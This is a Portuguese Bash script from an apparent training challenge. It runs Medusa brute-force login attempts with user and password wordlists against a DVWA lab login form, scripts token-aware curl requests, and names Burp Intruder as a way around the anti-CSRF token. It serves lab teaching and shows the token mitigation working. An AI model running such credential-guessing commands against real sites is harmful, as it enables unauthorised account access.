#!/usr/bin/env bash
# ============================================================
#  Bônus B — Formulário web (DVWA) com Medusa (Kali Linux)
#  Desafio DIO: força bruta SMB com Medusa
#
#  Uso:  ./05-bonus-dvwa.sh <IP_DO_ALVO>
#  Ex.:  ./05-bonus-dvwa.sh 192.168.56.20
#
#  Pré-requisitos no DVWA:
#    - login padrão: admin / password
#    - banco inicializado (setup.php -> Create / Reset Database)
#    - DVWA Security: Low (menu "DVWA Security")
#
#  ⚠️  Somente em laboratório com autorização!
# ============================================================

TARGET="${1:?Uso: $0 <IP_do_alvo>}"

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
USERS="$ROOT/wordlists/users.txt"
PASS="$ROOT/wordlists/passwords.txt"
OUT="$ROOT/results"
mkdir -p "$OUT"

echo "[*] Alvo: $TARGET — DVWA em http://$TARGET/login.php"

# (opcional) inicializa o banco do DVWA (o formulario de setup também usa token)
TOKEN=$(curl -s -c /tmp/dvwa.jar http://"$TARGET"/setup.php \
        | grep -oP "name='user_token' value='\K[a-f0-9]+")
curl -s -b /tmp/dvwa.jar -d "create_db=Create / Reset Database&user_token=$TOKEN" \
     http://"$TARGET"/setup.php -o /dev/null
echo "[+] Banco inicializado (se ainda não estava)"

echo
echo "[!] O formulário de login do DVWA inclui um campo oculto user_token"
echo "    (anti-CSRF). Sem o token, TODA tentativa recebe um redirecionamento"
echo "    HTTP 302 e é rejeitada — o módulo web-form do Medusa NÃO resolve o"
echo "    token sozinho. Este script demonstra a limitação."

echo
echo "[*] Ataque com o módulo web-form (sintaxe correta do Medusa 2.x)..."
medusa -h "$TARGET" \
       -U "$USERS" -P "$PASS" \
       -M web-form \
       -m FORM:'/login.php' \
       -m DENY-SIGNAL:'Login failed' \
       -m FORM-DATA:'post?username=&password=&Login=Login' \
       -t 4 -v 4 \
       -o "$OUT/medusa-dvwa.txt"

echo
echo "[+] Resultado esperado: 0 ACCOUNT FOUND — cada tentativa morre no 302"
echo "    do token anti-CSRF (a MITIGAÇÃO funcionando)."
echo
echo "[+] Controle manual (prova de que a credencial válida funciona):"
echo "    TOKEN=\$(curl -s -c c.txt http://$TARGET/login.php \\"
echo "             | grep -oP \"name='user_token' value='\\K[a-f0-9]+\")"
echo "    curl -s -b c.txt -d \"username=admin&password=password&Login=Login&user_token=\$TOKEN\" \\"
echo "         http://$TARGET/login.php"
echo "    -> 302 para index.php = login OK (admin/password)"
echo
echo "[+] Alternativas de brute force com token: Burp Intruder (Pitchfork com"
echo "    extração do token) ou script próprio (requests + regex do token)."
